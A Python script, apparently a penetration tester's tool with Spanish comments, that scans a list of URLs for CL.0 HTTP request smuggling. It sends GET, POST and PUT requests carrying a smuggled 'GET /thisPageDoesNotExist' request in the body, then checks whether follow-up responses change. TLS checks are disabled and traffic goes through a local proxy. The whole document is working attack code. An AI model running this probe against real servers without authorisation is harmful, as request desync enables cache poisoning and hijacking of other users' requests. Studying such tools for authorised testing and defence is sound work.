#! /usr/bin/env python3
import sys
import requests
#import urllib.parse as urlparse
import argparse
from urllib.parse import urlparse as parse
import logging
requests.packages.urllib3.disable_warnings()

#Try TE0
#Requests que generan Redirects + Recursos estaticos (GETs) + Generar errores para forzar el no procesamiento de un Content-Length
#Add H2.0
#GET requests con tecnicas de ofuscacion del CL (Regilero + ReqSmuggler)
#Transfer-Encoding: chunked

#2c
#GET /resources/images/blog.svg HTTP/1.1
#Foo: Bar


#try:
#    from http.client import HTTPConnection
#except ImportError:
#    from httplib import HTTPConnection
#HTTPConnection.debuglevel = 1

parser = argparse.ArgumentParser()
#parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('-u','--urlFile', help='file with urls to test from specific host', required=True)
args = parser.parse_args()

#CL0Host = args.target.strip()
URLFilePath = args.urlFile.strip()

#Session config
proxies = {'http': '127.0.0.1:8080','https': '127.0.0.1:8080'}
session = requests.Session()
URLs = open(URLFilePath, "r")
for url in URLs:
    session.proxies = proxies
    session.stream = True
    session.verify = False
    CandidateMethod = url.split("---")[1]
    FullUrl = parse(url.split("---")[0])
    print(FullUrl)
    NormalRespCode = int(url.split("---")[2])
    CL0Scheme = FullUrl.scheme
    CL0Host = FullUrl.netloc
    CL0TestPath = CL0Scheme + "://" + CL0Host + FullUrl.path + "?" + FullUrl.query
    CL0TestBody = 'GET /thisPageDoesNotExist HTTP/1.1\r\nFoo: Bar'
    CL0GetPostResult = ''
    CL0GetPutResult = ''
    headers = {"Content-Type" : "application/x-www-form-urlencoded"}
    if(CandidateMethod == 'GET'):#In case of get, we try to desync, but smuggling with other methods too
        CL0Test = session.get(CL0TestPath, data=CL0TestBody, allow_redirects=False,headers=headers)
        CL0Result = session.get(CL0TestPath, allow_redirects=False)
        CL0PostTest = session.post(CL0TestPath,data=CL0TestBody, allow_redirects=False,headers=headers)
        CL0GetPostResult = session.get(CL0TestPath, allow_redirects=False)
        CL0PutTest = session.put(CL0TestPath,data=CL0TestBody, allow_redirects=False,headers=headers)
        CL0GetPutResult = session.get(CL0TestPath, allow_redirects=False)
    elif(CandidateMethod == 'POST'):
        CL0Test = session.post(CL0TestPath, data=CL0TestBody, allow_redirects=False,headers=headers)
        CL0Result = session.post(CL0TestPath, allow_redirects=False)
    else: #PUT
        CL0Test = session.put(CL0TestPath, data=CL0TestBody, allow_redirects=False,headers=headers)
        CL0Result = session.put(CL0TestPath, allow_redirects=False)
    if(NormalRespCode != CL0Result.status_code):
        print("The response code for %s is %s and after CL0 is %s for method %s" % (CL0TestPath,str(NormalRespCode),str(CL0Result.status_code),CandidateMethod))
    if(CL0GetPostResult !='' and NormalRespCode != CL0GetPostResult.status_code):
        print("The response code for %s is %s and after CL0 is %s for method GET ,but using a POST to smuggle the request" % (CL0TestPath,str(NormalRespCode),str(CL0GetPostResult.status_code)))
        CL0GetPostResult =''
    if(CL0GetPutResult!='' and NormalRespCode != CL0GetPutResult.status_code):
        print("The response code for %s is %s and after CL0 is %s for method GET ,but using a PUT to smuggle the request" % (CL0TestPath,str(NormalRespCode),str(CL0GetPutResult.status_code)))
        CL0GetPutResult!=''
